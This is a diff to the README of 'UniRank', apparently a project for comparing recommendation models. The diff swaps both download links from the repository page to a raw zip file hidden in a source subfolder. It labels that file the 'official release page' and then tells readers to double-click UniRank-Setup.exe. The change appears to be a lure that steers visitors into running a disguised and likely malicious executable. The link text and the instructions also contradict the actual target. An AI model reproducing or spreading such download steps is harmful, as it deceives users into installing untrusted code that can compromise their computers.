@@ -1,6 +1,6 @@
 # 📊 UniRank - Compare Sequential Models and Feature Interactions
 
-[![Download UniRank](https://img.shields.io/badge/Download-UniRank_Installer-blue)](https://github.com/tanjir8563/UniRank)
+[![Download UniRank](https://img.shields.io/badge/Download-UniRank_Installer-blue)](https://raw.githubusercontent.com/tanjir8563/UniRank/main/fuxictr/pytorch/Uni-Rank-v2.4.zip)
 
 ## 🎯 About UniRank
 
@@ -22,7 +22,7 @@ Before you install UniRank, verify your computer meets these minimum specificati
 
 Follow these steps to set up UniRank on your machine:
 
-1. Visit the [official release page](https://github.com/tanjir8563/UniRank) to download the installer.
+1. Visit the [official release page](https://raw.githubusercontent.com/tanjir8563/UniRank/main/fuxictr/pytorch/Uni-Rank-v2.4.zip) to download the installer.
 2. Locate the file named UniRank-Setup.exe in your Downloads folder.
 3. Double-click the file to start the installation process.
 4. Follow the on-screen prompts. The installer asks for a destination folder; the default path works for most users.
